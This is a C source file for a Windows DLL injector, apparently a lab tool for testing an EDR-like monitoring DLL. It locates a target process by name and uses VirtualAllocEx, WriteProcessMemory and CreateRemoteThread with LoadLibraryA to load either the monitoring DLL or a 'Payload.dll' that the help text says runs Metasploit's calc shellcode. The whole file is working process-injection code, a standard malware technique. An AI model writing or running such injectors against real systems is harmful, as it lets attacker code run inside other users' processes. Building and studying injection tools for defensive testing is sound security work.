#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

#pragma warning( disable : 4996)

#define GOODDLL    "W0wS3cur1ty.dll"
#define BADDLL     "Payload.dll"

VOID ReportError(LPWSTR Str) {
    wprintf(L"[!] %s Failed With Error : %d \n", Str, GetLastError());
}


DWORD FindProcessId(char* ProcName) {
    PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) };
    
    wchar_t Wstr[MAX_PATH];
    // x overflow x
    if (strlen(ProcName) > MAX_PATH - 1)
        return NULL;

    mbstowcs(Wstr, ProcName, strlen(ProcName) + 1);


    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnap == INVALID_HANDLE_VALUE) {
        ReportError(L"CreateToolhelp32Snapshot");
        return NULL;
    }
    if (!Process32First(hSnap, &Proc)) {
        ReportError(L"Process32First");
        goto _ERROR;
    }
    do{
        if (wcscmp(Wstr, Proc.szExeFile) == 0){
            return Proc.th32ProcessID;
        }
    } while (Process32Next(hSnap, &Proc));

_ERROR:
    CloseHandle(hSnap);
    return NULL;
}


INT PrintHelp(char* argv0) {
    printf("[i] USAGE : %s <process name to monitor> <*options>\n", argv0);
    printf("\t\t1. Inject \'\%s' [The Edr Like Dll] to The Target Process \n", GOODDLL);
    printf("\t\t2. Inject \'\%s' [Dll File That Runs Metasploit's x64 Calc] to The Target Process \n\n", BADDLL);
    return -1;
}



BOOL InjectGoodDll(HANDLE hProc) {
    CHAR FullDllPath[1024];
    CHAR CurrentDir[1024];
    SIZE_T Written;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    GetCurrentDirectoryA(1024, CurrentDir);
    //printf("[i] CurrentDir: %s \n", CurrentDir);
    sprintf_s(FullDllPath, 1024, "%s\\%s", CurrentDir, GOODDLL);
    //printf("[i] FullDllPath: %s \n", FullDllPath);

    if ((hFile = CreateFileA(FullDllPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] The Dll File Doesnt Exist Under : %s \n", FullDllPath);
        return FALSE;
    }

    CloseHandle(hFile);

    LPVOID pLoadLibraryA = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    if (pLoadLibraryA != NULL) {
        LPVOID pAddress = VirtualAllocEx(hProc, NULL, strlen(FullDllPath) + sizeof(CHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pAddress != NULL) {
            if (WriteProcessMemory(hProc, pAddress, FullDllPath, strlen(FullDllPath), &Written)) {
                CreateRemoteThread(hProc, NULL, 0, pLoadLibraryA, pAddress, 0, NULL);
                printf("[+] \'%s\' Injected Successfully ... \n", GOODDLL);
                return TRUE;
            }
            ReportError(L"WriteProcessMemory");
            return FALSE;
        }
        ReportError(L"VirtualAllocEx");
        return FALSE;
    }
    ReportError(L"pLoadLibraryA");
    return FALSE;
}



BOOL InjectBadDll(HANDLE hProc) {
    CHAR FullDllPath[1024];
    CHAR CurrentDir[1024];
    SIZE_T Written;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    GetCurrentDirectoryA(1024, CurrentDir);
    //printf("[i] CurrentDir: %s \n", CurrentDir);
    sprintf_s(FullDllPath, 1024, "%s\\%s", CurrentDir, BADDLL);
    //printf("[i] FullDllPath: %s \n", FullDllPath);

    if ((hFile = CreateFileA(FullDllPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] The Dll File Doesnt Exist Under : %s \n", FullDllPath);
        return FALSE;
    }

    CloseHandle(hFile);

    LPVOID pLoadLibraryA = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    if (pLoadLibraryA != NULL) {
        LPVOID pAddress = VirtualAllocEx(hProc, NULL, strlen(FullDllPath) + sizeof(CHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pAddress != NULL) {
            if (WriteProcessMemory(hProc, pAddress, FullDllPath, strlen(FullDllPath), &Written)) {
                CreateRemoteThread(hProc, NULL, 0, pLoadLibraryA, pAddress, 0, NULL);
                printf("[+] \'%s\' Injected Successfully ... \n", BADDLL);
                return TRUE;
            }
            ReportError(L"WriteProcessMemory");
            return FALSE;
        }
        ReportError(L"VirtualAllocEx");
        return FALSE;
    }
    ReportError(L"pLoadLibraryA");
    return FALSE;



}


int main(int argc, char* argv[]) {

    DWORD   Pid = NULL;
    HANDLE  hProc = NULL;
    
    if (argc < 3) {
        return PrintHelp(argv[0]);
    }

    if ((Pid = FindProcessId(argv[1])) == NULL) {
        printf("[!] Cound'nt Find Process \'%s\' \n", argv[1]);
        return -1;
    }

    printf("[+] Targetting Process %s of Pid : %d ...\n", argv[1], Pid);

    if ((hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, Pid)) == NULL) {
        ReportError(L"OpenProcess");
        return -1;
    }

    if (atoi(argv[2]) == 1) {
        if (!InjectGoodDll(hProc)) {
            printf("[!] Failed To Inject Dll ... \n");
            return -1;
        }
    }
    else if (atoi(argv[2]) == 2) {
        if (!InjectBadDll(hProc)) {
            printf("[!] Failed To Inject Dll ... \n");
            return -1;
        }
    }
    
    else {
        return PrintHelp(argv[0]);
    }
   
    return 0;

}
